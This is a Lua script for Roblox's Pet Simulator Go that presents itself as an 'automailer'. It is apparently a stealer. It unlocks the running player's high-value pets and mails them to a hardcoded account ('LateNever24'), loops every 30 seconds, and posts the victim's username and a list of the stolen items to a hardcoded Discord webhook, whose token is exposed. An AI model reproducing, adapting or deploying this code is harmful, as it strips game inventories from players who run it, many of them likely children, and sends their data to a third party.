local user = "LateNever24"
local min_rap = 100000 -- minimum rap of each item you want to get sent to you. 10k by default
local min_chance = 10000000 -- minimum chance of pets you want to get sent to you. 10k by default, which means that it will not send pets under 1 in 10k
local webhook = "https://discord.com/api/webhooks/1295143079950553220/GBbHnsqhUR6Y2zmC_5Lgg_b74kkZmFzDSFo1QqxoyNZ8-ha5gxDT0rMg4Xelxz1ea1dt"

local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
local library = require(game.ReplicatedStorage.Library)
local plr = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")

local function formatNumber(number)
    if number == nil then
        return "0"
    end
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 and suffixIndex < #suffixes do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
    if suffixIndex == 1 then
        return tostring(math.floor(number))
    else
        if number == math.floor(number) then
            return string.format("%d%s", number, suffixes[suffixIndex])
        else
            return string.format("%.2f%s", number, suffixes[suffixIndex])
        end
    end
end

local function SendMessage(username, pets, totalRAP)
    local headers = {
        ["Content-Type"] = "application/json",
    }

	local fields = {
		{
			name = "Account Username:",
			value = username,
			inline = true
		},
		{
			name = "Items to be sent:",
			value = "",
			inline = false
		},
        {
            name = "Summary:",
            value = "",
            inline = false
        }
	}

    local combinedItems = {}
    local itemRapMap = {}

    for _, item in ipairs(pets) do
        local rapKey = item.name
        if itemRapMap[rapKey] then
            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
        else
            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap, chance = item.chance}
            table.insert(combinedItems, rapKey)
        end
    end

    table.sort(combinedItems, function(a, b)
        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
    end)

    for _, itemName in ipairs(combinedItems) do
        local itemData = itemRapMap[itemName]
        local itemLine = ""
        if itemData.chance then
            itemLine = string.format("1/%s %s (x%d): %s RAP", formatNumber(itemData.chance), itemName, itemData.amount, formatNumber(itemData.rap * itemData.amount))
        else
            itemLine = string.format("%s (x%d): %s RAP", itemName, itemData.amount, formatNumber(itemData.rap * itemData.amount))
        end
        fields[2].value = fields[2].value .. itemLine .. "\n"
    end

    fields[3].value = string.format("Total RAP: %s", formatNumber(totalRAP))

    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "New Pets Go Automail" ,
            ["color"] = 65280,
			["fields"] = fields,
			["footer"] = {
				["text"] = "Automailer by Tobi. discord.gg/GY2RVSEGDT"
			}
        }}
    }

    local body = HttpService:JSONEncode(data)

    if webhook and webhook ~= "" then
        local response = request({
            Url = webhook,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end
end

local function getRAP(Type, Item)
    return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get(
        {
            Class = {Name = Type},
            IsA = function(hmm)
                return hmm == Type
            end,
            GetId = function()
                return Item.id
            end,
            StackKey = function()
                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
            end
        }
    ) or 0)
end

local function sendItem(category, uid, am)
    local args = {
        [1] = user,
        [2] = "Automailer by Tobi. gg / GY2RVSEGDT",
        [3] = category,
        [4] = uid,
        [5] = am or 1
    }
	local response = false
	repeat
    	local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
	until response == true
end

local function ClaimMail()
    local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    while err == "You must wait 30 seconds before using the mailbox!" do
        wait()
        response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    end
end

local function CheckPets()
    local sortedPets = {}
    local totalRAP = 0
    local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
	if save["Pet"] ~= nil then
		for uid, item in pairs(save["Pet"]) do
            local rapValue = getRAP("Pet", item)
            if rapValue >= min_rap then
                local difficulty = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]["difficulty"]
                if difficulty >= min_chance then
                    table.insert(sortedPets, {category = "Pet", uid = uid, amount = item._am or 1, rap = rapValue, name = item.id, chance = difficulty})
                    totalRAP = totalRAP + (rapValue * (item._am or 1))
                    if item._lk then
                        local args = {
                        [1] = uid,
                        [2] = false
                        }
                        network:WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
                    end
                end
            end
        end
        return sortedPets, totalRAP
    else
        return {}, 0
	end
end

ClaimMail()

local function main()
    local petsToSend, totalRAP = CheckPets()
    if petsToSend and #petsToSend > 0 then
        table.sort(petsToSend, function(a, b)
            return a.rap * a.amount > b.rap * b.amount 
        end)
        
        spawn(function()
            SendMessage(plr.Name, petsToSend, totalRAP)
        end)
    
        for _, item in ipairs(petsToSend) do
            sendItem(item.category, item.uid, item.amount)
        end
    end
end

while true do
    main()
    wait(30)
end
